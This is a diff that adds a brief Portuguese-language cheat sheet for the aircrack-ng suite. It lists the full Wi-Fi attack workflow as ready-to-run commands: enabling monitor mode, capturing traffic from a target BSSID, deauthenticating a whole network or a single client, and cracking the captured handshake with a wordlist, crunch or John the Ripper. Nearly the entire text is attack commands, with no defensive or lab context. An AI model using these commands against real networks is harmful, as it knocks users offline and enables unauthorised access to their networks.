@@ -1,0 +1,49 @@
+       _                         _                     
+  __ _(_)_ __ ___ _ __ __ _  ___| | __     _ __   __ _ 
+ / _` | | '__/ __| '__/ _` |/ __| |/ /____| '_ \ / _` |
+| (_| | | | | (__| | | (_| | (__|   <_____| | | | (_| |
+ \__,_|_|_|  \___|_|  \__,_|\___|_|\_\    |_| |_|\__, |
+                                                 |___/ 
+
+#ver interface de rede. 
+
+iwconfig
+
+#starta o modo mointor a interface escolihda.
+
+sudo airmon-ng start <interface>
+
+#captura todos os pacotes poximos a partir da interface de rede.
+
+sudo airodump-ng <interface>
+
+#filtra os pacotes capturados por um Macadress, canal, e envia pra um arquivo de saida.
+
+sudo airodump-ng --bssid [BSSID] --channel [CH] -w [arquivo_saida] <interface>
+
+#desautenticar{
+
+#desautentica toda a rede.
+
+sudo aireplay-ng --deauth <pacotes> -a [BSSID] <interface>
+
+
+#desautentica apenas um cliente especifico da rede.
+
+sudo aireplay-ng --deauth <pacotes> -a [BSSID] -c [MAC CLIENTE] <interface>
+}
+
+#quebra da senha com o aircrack-ng.{
+
+# a partir de uma wordlist.
+
+sudo aircrack-ng -w [wordlist] -b [BSSID] [arquivo_saida].cap
+
+#a partir do crunch.  
+
+crunch 8 12 abcdef1234 | sudo aircrack-ng -b [BSSID] -w - [arquivo_saida].cap
+
+#a partir do jhon the ripper.
+
+john --incremental --stdout | sudo aircrack-ng -b [BSSID] -w - [arquivo_saida].cap
+}
